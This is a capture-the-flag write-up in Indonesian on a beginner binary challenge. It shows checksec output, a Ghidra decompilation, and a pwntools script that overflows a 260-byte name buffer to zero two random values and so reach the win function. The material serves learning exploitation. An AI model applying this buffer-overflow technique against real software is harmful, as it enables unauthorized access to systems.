# BB1 

## note
chall ini gaada deskripsi atau flag di dump chall nya. hanya ada file binary nya jadi okelah.

buat flag.txt di folder yg sama dengan binary

# analysis & exploit

cari informasi seputar metadata dan proteksi binary
```
└> file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a0d6480db4c8aefd4a0d040fb1e068e376792f46, for GNU/Linux 3.2.0, not stripped
└> pwn checksec chall
zsh: /home/rotalactf/tools/pwndbg/.venv/bin/pwn: bad interpreter: /home/rotalactf/pwndbg/.venv/bin/python3: no such file or directory
[*] '/home/rotalactf/reno/pwn/LKS/bb1/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled

```

ups error env python, no problen kayanya. . rupanya ini adalah file binary x86-64 dan kabar baiknya tertulis not stripped. jadi symbols dan nama fungsi tidak hilang.

aku jalankan program untuk melihat bagaimana "tampilan user" dari file binary ini

```
└> ./chall
Welcome to the Jail Escape Game!
What is your name? AMBATUKAAAAAAM

Hello, AMBATUKAAAAAAM! You are trapped in jail. Let's see if you can escape!

What do you want to do ?
1. Try to escape
2. Play game for escape
3. Quit the game
Enter your choice: 1

You tried to escape... but got caught! Stay in jail!

What do you want to do ?
1. Try to escape
2. Play game for escape
3. Quit the game
Enter your choice: 2

What is your secret answer :
Enter your answer: 67676767

Wrong answer. You're still in jail. Try again!
```

sepertinya kita butuh secret answer untuk bisa lolos. tapi mana flagnya?

aku lanjutkan static analysis dengan ghidra:

## main func
```C
undefined8 main(void)

{
  size_t sVar1;
  int local_120;
  uint local_11c;
  char local_118 [0x104];
  int local_14;
  int local_10;
  int local_c;
  
  randomize(&local_10,&local_14);
  puts("Welcome to the Jail Escape Game!");
  printf("What is your name? ");
  fgets(local_118,0x200,stdin);
  sVar1 = strcspn(local_118,"\n");
  local_118[sVar1] = '\0';
  printf("\nHello, %s! You are trapped in jail. Let\'s see if you can escape!\n",local_118);
LAB_00101392:
  do {
    while( true ) {
      puts("\nWhat do you want to do ?");
      puts("1. Try to escape");
      puts("2. Play game for escape");
      puts("3. Quit the game");
      printf("Enter your choice: ");
      __isoc99_scanf(&DAT_00102123,&local_11c);
      if (local_11c == 0x3) {
        puts("\nYou chose to quit the game. Goodbye !");
        return 0x0;
      }
      if (local_11c < 0x4) break;
LAB_00101536:
      puts("\nInvalid choice. Please select a valid option.");
    }
    if (local_11c != 0x1) {
      if (local_11c != 0x2) goto LAB_00101536;
      local_c = local_14 + local_10;
      puts("\nWhat is your secret answer :");
      printf("Enter your answer: ");
      __isoc99_scanf(&DAT_00102123,&local_120);
      if (local_c != local_120) {
        puts("\nWrong answer. You\'re still in jail. Try again!");
                    /* WARNING: Subroutine does not return */
        exit(0x1);
      }
      printf("\nCongratulations, %s! You solved the puzzle and you have key for escaping from jail!\n"
             ,local_118);
      inJail = 0x0;
      goto LAB_00101392;
    }
    printf("\nYou tried to escape... ");
    if (inJail == 0x0) {
      printf("\nEnjoy your freedom, %s! You\'re now out of jail.\n",local_118);
      win();
    }
    else {
      puts("but got caught! Stay in jail!");
    }
  } while( true );
}

```
vulnerable spotted ,

```C
  char local_118 [0x104];

  ########### # code # ############
  printf("What is your name? ");
  fgets(local_118,0x200,stdin);
```

saat program menanyakan siapa namaku, dia mengizinkan fgets menerima input sebanyak `0x200` bytes, sedangkan variabel yang menampung input ku tersebut hanya merupakan
array char dengan ukuran `0x104` maka jelas akan terjadi buffer overflow. dan menimpa alamat memori lain seperti variabel yang ada di bawahnya.


selanjutnya jika fokus ke bagian secret tadi :
```C
      puts("\nWhat is your secret answer :");
      printf("Enter your answer: ");
      __isoc99_scanf(&DAT_00102123,&local_120);
      if (local_c != local_120) {
        puts("\nWrong answer. You\'re still in jail. Try again!");
                    /* WARNING: Subroutine does not return */
        exit(0x1);
      }
      printf("\nCongratulations, %s! You solved the puzzle and you have key for escaping from jail!\n"
             ,local_118);
      inJail = 0x0;
      goto LAB_00101392;
```
input ku `local_120` akan dibandingkan dengan `local_c`. jika sama akan berhasil dan punya key nya untuk kabur. key ini bisa digunakan untuk mengambil flag di fungsi win() jika 
aku memilih menu 1 dalam kondisi inJail = 0x0

local_c berasal dari hasil penjumlahan 2 variabel (`local_10` + `local14`) yang sebelumnya valuenya telah diacak dengan fungsi `randomize()` di awal program.

akan sangat mustahil menebaknya , namun setelah dipikir2 lagi ternyata aku tidak perlu menebak angka random itu. aku akan memanfaatkan kerentanan `buffer overflow`
untuk menimpa dan memanipulasi variabel penjumlahan tersebut lalu memprediksi hasil penjumlahan.

## note
variabel buffer nama memiliki ukuran 0x104 atau 260 dalam desimal. aku akan mengisinya dengan padding / byte sampah.  
ukuran dari variabel dengan tipe data int adalah 4 byte , jadi payload harus minimal sepanjang 8 byte untuk dapat menimpa 2 variabel tersebut

(karena 2 variabel yg di randomize dan dijumlahkan tersusun berurutan)

skrip python : 

```Python3
from pwn import *

p = process("./chall")
pad = b"a"*260
val1 = (0).to_bytes(8,byteorder='little')

pay = pad + val1
p.sendlineafter(b'?',pay)
p.interactive()
```

`val1 = (0).to_bytes(8,byteorder='little')` bagian ini semacam merubah angka 0 jadi sepanjang 8 byte untuk memenuhi nilai variabel pertama dan kedua yang masing masingnya
4byte.

intinya jika aku menjalankan program ini, variabel penjumlahan yang di randomize tersebut value nya akan tertimpa dengan nilai nol semua. jadi rumus penjumlahannya akan jadi
0 + 0 = 0

<p align="center"><img width="1304" height="916" alt="image" src="https://github.com/user-attachments/assets/55126911-5532-48dd-bf2c-3cd8e272e384" /> </p>

atau ini kode versi otomasi nya

```Python
from pwn import *

p = process("./chall")
pad = b"a"*260
val1 = (0).to_bytes(8,byteorder='little')

pay = pad + val1
p.sendlineafter(b'?',pay)

#otomasi aja si ini biar ga screenshoot terus
p.sendlineafter(b':',b'2')
p.sendlineafter(b':',b'0')
p.sendlineafter(b':',b'1')
p.interactive()
```
```
└> python3 solver.py
[+] Starting local process './chall': pid 12674
[*] Switching to interactive mode

Congratulations, ! You solved the puzzle and you have key for escaping from jail!

What do you want to do ?
1. Try to escape
2. Play game for escape
3. Quit the game
Enter your choice:
You tried to escape...
Enjoy your freedom, ! You're now out of jail.
THPCTF{omaga_flag_flag_flag}


```

done, flag bikin sendiri


